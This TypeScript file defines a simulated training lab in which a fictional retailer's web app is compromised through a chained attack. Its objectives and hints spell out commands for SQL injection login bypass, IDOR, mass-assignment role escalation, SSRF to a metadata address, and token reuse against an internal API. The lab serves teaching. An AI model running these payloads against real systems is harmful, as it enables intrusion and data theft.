import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker(extra?: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir(extra ?? {}) }) };
}

/** Web module capstone: one continuous five-flag chain across a single web application and the internal
 *  API it reaches — content discovery, an authentication-bypass login flaw, IDOR, mass assignment, and
 *  SSRF into an internal service — instead of five isolated single-vulnerability labs. Every `vulnRoutes`
 *  mechanic here is already established elsewhere on this platform (gobuster/vulnRoutes/curl); the point
 *  of a capstone is chaining several vulnerability CLASSES together the way a real web app pentest report
 *  does, since real apps are rarely broken by exactly one bug in isolation. */
export const webCapstoneLabs: LabScenario[] = [
  {
    id: 'web-capstone-forgotten-admin-panel-to-internal-api',
    title: 'Capstone: A Forgotten Admin Panel Chains Into Full Internal API Access',
    difficulty: 'Hard',
    category: 'Web',
    briefing:
      "Northbridge Retail's storefront looks unremarkable from the outside — until content discovery turns " +
      'up a legacy admin panel nobody remembered was still deployed. From there, four separate, individually ' +
      'ordinary-looking flaws (a login that never sanitized its query, an order-lookup endpoint with no ' +
      'ownership check, a profile-update endpoint that trusts every field the client sends, and a report ' +
      'generator that fetches whatever URL you give it) chain together into full access to an internal API ' +
      'that was never meant to be reachable from the public internet at all. No single step here is exotic — ' +
      'the actual finding is how far a chain of "minor" issues reaches when nobody\'s treating them as connected.',
    objectives: [
      {
        text: 'gobuster -u 10.10.180.5 -w wordlist.txt to find the forgotten admin panel',
        why: 'Content discovery against a "clean-looking" front end routinely turns up exactly this kind of forgotten deployment — the panel was never linked from anywhere a normal visitor (or a normal crawler) would find it.',
      },
      {
        text: 'sqlmap -u "http://10.10.180.5/admin-legacy/login?username=admin" --batch --dump and capture the first flag',
        why: "The login endpoint concatenates the username directly into a backend query — confirmed the moment a classic injection payload authenticates without a real password, exactly the automated confirm-and-dump workflow this platform's other sqlmap labs already teach.",
      },
      {
        text: 'curl "http://10.10.180.5/admin-legacy/orders?order_id=90045" and capture the second flag',
        why: "The admin session from the login bypass is honored on this endpoint with no per-object ownership check at all — the same IDOR pattern from the API Security module, just reached this time through a stolen admin session instead of a normal user one.",
      },
      {
        text: 'curl -X POST -d "user_id=admin-legacy&role=superadmin" http://10.10.180.5/admin-legacy/profile and capture the third flag',
        why: 'The profile-update endpoint blindly trusts every field in the request body, including one that was never meant to be client-settable at all — real frameworks that auto-bind request bodies to models are exactly where this class of bug keeps recurring.',
      },
      {
        text: 'curl "http://10.10.180.5/admin-legacy/reports/generate?source_url=http://169.254.169.254/internal-token" and capture the fourth flag',
        why: 'The "generate a report from this URL" feature performs a genuine server-side fetch with no allowlist at all — reaching the same class of internal-only address this platform\'s Cloud module SSRF lab reaches, just via a different feature entirely.',
      },
      {
        text: 'curl -H "X-Internal-Token: <token-from-the-SSRF-response>" http://10.10.180.9/internal/export and capture the final flag',
        why: 'This is the actual endpoint of the chain: a token meant only for internal, trusted service-to-service calls, extracted entirely through a public-facing web app that was never supposed to be able to reach it at all.',
      },
    ],
    hints: [
      'gobuster -u 10.10.180.5 -w wordlist.txt',
      'sqlmap -u "http://10.10.180.5/admin-legacy/login?username=admin\' OR \'1\'=\'1" --batch --dump',
      'curl "http://10.10.180.5/admin-legacy/orders?order_id=90045"',
      'curl -X POST -d "user_id=admin-legacy&role=superadmin" http://10.10.180.5/admin-legacy/profile',
      'curl "http://10.10.180.5/admin-legacy/reports/generate?source_url=http://169.254.169.254/internal-token"',
      'curl -H "X-Internal-Token: NB-INT-88213-TOKEN" http://10.10.180.9/internal/export',
    ],
    totalFlags: 5,
    attacker: attacker({
      'wordlist.txt': file('admin\nadmin-legacy\ndashboard\napi\nbackup\nstaging\n'),
    }),
    network: [
      {
        hostname: 'shopfront-web01',
        ip: '10.10.180.5',
        os: 'Ubuntu 22.04 (nginx + legacy PHP admin panel)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'nginx 1.24.0 + PHP 7.4 (legacy admin panel)',
            http: {
              '/': '<html><body><h1>Northbridge Retail</h1></body></html>',
              '/robots.txt': 'User-agent: *\nDisallow: /admin-legacy\n',
            },
            vulnRoutes: [
              {
                kind: 'sqli',
                path: '/admin-legacy/login',
                param: 'username',
                triggerSubstrings: ["' or '1'='1", "or 1=1"],
                vulnerableResponse:
                  '{"status":"authenticated","session":"admin-legacy-sess-9f3a","note":"login query never sanitized the username field","flag":"flag{admin_login_sqli_authentication_bypass}"}',
                normalResponse: '{"status":"unauthorized"}',
              },
              {
                kind: 'idor',
                path: '/admin-legacy/orders',
                param: 'order_id',
                triggerSubstrings: ['90045'],
                vulnerableResponse:
                  '{"order_id":90045,"customer":"D. Alvarez","card_last4":"7719","address":"412 Elm St","flag":"flag{admin_orders_endpoint_idor_no_ownership_check}"}',
                normalResponse: '{"error":"order not found"}',
              },
              {
                kind: 'mass-assignment',
                path: '/admin-legacy/profile',
                param: 'role',
                triggerSubstrings: ['superadmin'],
                vulnerableResponse:
                  '{"status":"updated","user_id":"admin-legacy","role":"superadmin","note":"the role field was never meant to be client-settable","flag":"flag{profile_update_mass_assignment_role_escalation}"}',
                normalResponse: '{"status":"updated","fields":["display_name"]}',
              },
              {
                kind: 'ssrf',
                path: '/admin-legacy/reports/generate',
                param: 'source_url',
                triggerSubstrings: ['169.254.169.254', 'internal-token', 'localhost', '127.0.0.1'],
                vulnerableResponse:
                  '{"status":"fetched","body":"{\\"internal_token\\":\\"NB-INT-88213-TOKEN\\"}","flag":"flag{report_generator_ssrf_leaks_internal_service_token}"}',
                normalResponse: '{"status":"fetched","body":"(unreachable from this feature\'s intended use)"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
      {
        hostname: 'internal-orders-api',
        ip: '10.10.180.9',
        os: 'Internal-only service (never intended to be internet-reachable)',
        services: [
          {
            port: 80,
            name: 'http',
            version: 'internal microservice — trusts any request carrying a valid service token',
            vulnRoutes: [
              {
                kind: 'auth-bypass',
                path: '/internal/export',
                param: 'X-Internal-Token',
                location: 'header',
                triggerSubstrings: ['NB-INT-88213-TOKEN'],
                vulnerableResponse:
                  '{"status":"export_complete","records":6204,"note":"authenticated using a token that was only ever meant for internal service-to-service calls","flag":"flag{internal_api_reached_via_ssrf_leaked_service_token}"}',
                normalResponse: '{"error":"unauthorized","message":"this endpoint is not intended to be reachable externally"}',
              },
            ],
          },
        ],
        users: [],
        root: dir({}),
      } as HostDef,
    ],
  },
];
